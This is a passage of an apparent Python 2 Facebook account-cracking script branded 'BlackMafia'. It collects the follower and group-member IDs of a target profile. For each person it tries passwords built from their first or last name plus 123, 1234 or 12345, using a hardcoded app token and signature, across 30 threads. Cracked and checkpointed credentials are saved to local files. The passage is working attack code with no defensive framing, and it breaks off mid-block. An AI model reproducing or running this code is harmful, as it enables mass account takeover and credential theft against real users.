    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80BlackMafia\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/grup.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos1
                cek = open('done/grup.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/grup.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos2
                    cek = open('done/grup.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/grup.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos3
                        cek = open('done/grup.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = j['last_name'].lower() + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/grup.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos4
                            cek = open('done/grup.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['last_name'].lower() + '1234'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/grup.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos5
                                cek = open('done/grup.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['last_name'].lower() + '12345'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/grup.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m' + zowe
                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m' + bos6
                                    cek = open('done/grup.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80BlackMafia\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mFinished ...'
    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;96mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;96m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;96mCP \x1b[1;96mfile save \x1b[1;91m: \x1b[1;92mdone/grup.txt'
    print 36 * '\x1b[1;94m\xe2\x96\x93'
    raw_input('\x1b[1;97m{<\x1b[1;96mBack\x1b[1;97m>}')
    os.system('python2 lovehacker.py')


def crack_follow():
    toket = open('login.txt', 'r').read()
    os.system('clear')
    print logo
    print 36 * '\x1b[1;94m\xe2\x96\x93'
    print '              \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK FOLLOWERS \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
    print 36 * '\x1b[1;94m\xe2\x96\x93'
    idt = raw_input('\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mID Public/friend \x1b[1;91m:\x1b[1;92m ')
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        op = json.loads(jok.text)
        print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
    except KeyError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID public/friend there is no !'
        raw_input('\n\x1b[1;95m[\x1b[1;97m<Back>\x1b[1;95m]')
        menu()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} No internet Conection !'
        keluar()

    r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + toket)
    z = json.loads(r.text)
    for i in z['data']:
        id.append(i['id'])

    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mTotal ID Followers \x1b[1;91m:\x1b[1;92m ' + str(len(id))
    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mStop Tekan CTRL+Z'
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mCrack Starting ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\n\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mUse Airplane Mode If Nothing Is Working'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80BlackMafia\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/follow.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos1
                cek = open('done/follow.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/follow.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos2
                    cek = open('done/follow.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/follow.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos3
                        cek = open('done/follow.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = j['last_name'].lower() + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/follow.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos4
                            cek = open('done/follow.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['last_name'].lower() + '1234'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/follow.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos5
                                cek = open('done/follow.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['last_name'].lower() + '12345'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/follow.txt', 'a')
